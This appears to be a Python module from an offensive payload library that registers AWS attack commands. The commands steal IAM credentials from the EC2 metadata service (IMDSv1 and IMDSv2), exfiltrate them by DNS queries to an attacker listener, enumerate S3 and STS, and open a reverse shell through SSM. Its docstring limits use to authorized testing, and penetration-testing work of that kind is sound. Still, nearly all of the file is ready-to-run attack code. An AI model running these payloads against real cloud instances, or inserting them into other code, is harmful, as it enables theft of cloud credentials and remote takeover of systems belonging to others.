"""AWS / cloud metadata exfiltration payloads.

These target the IMDS (Instance Metadata Service) — the credentials
endpoint on EC2. Run on the target host you are authorized to test.
"""

from payloadforge.payloads.registry import register

register(
    "aws_imds_enum",
    "cloud", "bash",
    "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "List IAM role names available on an EC2 instance via IMDSv1.",
    testable=False,
    test_note="Requires an EC2 instance. Will 404 on non-AWS hosts.",
    tags=["aws", "imds", "recon"],
)

register(
    "aws_imds_creds",
    "cloud", "bash",
    "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1)",
    "Steal temporary IAM credentials (AccessKey, SecretKey, Token) from IMDS.",
    testable=False,
    test_note="Requires an EC2 instance with an attached IAM role.",
    tags=["aws", "imds", "creds"],
)

register(
    "aws_imds_creds_v2",
    "cloud", "bash",
    "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'); ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE",
    "IMDSv2 (token-based) credential theft. Works on hardened instances.",
    testable=False,
    test_note="Requires EC2 instance with IMDSv2 enabled.",
    tags=["aws", "imdsv2", "creds"],
)

register(
    "aws_exfil_dns",
    "cloud", "bash",
    "CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/|head -1) | base64 -w0 | fold -w60 | while read c; do nslookup $c.{lhost}; done); echo done",
    "Exfil IAM credentials via DNS queries to your listener (bypasses egress firewalls).",
    testable=False,
    test_note="Requires EC2 instance + DNS listener you control.",
    tags=["aws", "dns", "exfil"],
)

register(
    "aws_s3_enum",
    "cloud", "bash",
    "aws s3 ls s3:// 2>/dev/null; aws sts get-caller-identity",
    "Enumerate S3 buckets and STS identity from a compromised AWS CLI session.",
    testable=False,
    test_note="Requires AWS CLI + configured credentials.",
    tags=["aws", "s3", "recon"],
)

register(
    "aws_ssm_exec",
    "cloud", "python",
    "python3 -c 'import boto3,json;c=boto3.client(\"ssm\");print(c.send_command(Targets=[{\"Key\":\"tag:Name\",\"Values\":[\"TARGET\"]}],DocumentName=\"AWS-RunShellScript\",Parameters={\"commands\":[\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"]}))'",
    "Execute shell commands on EC2 instances via AWS Systems Manager (if role allows).",
    testable=False,
    test_note="Requires ssm:SendCommand IAM permission.",
    tags=["aws", "ssm", "lateral"],
)
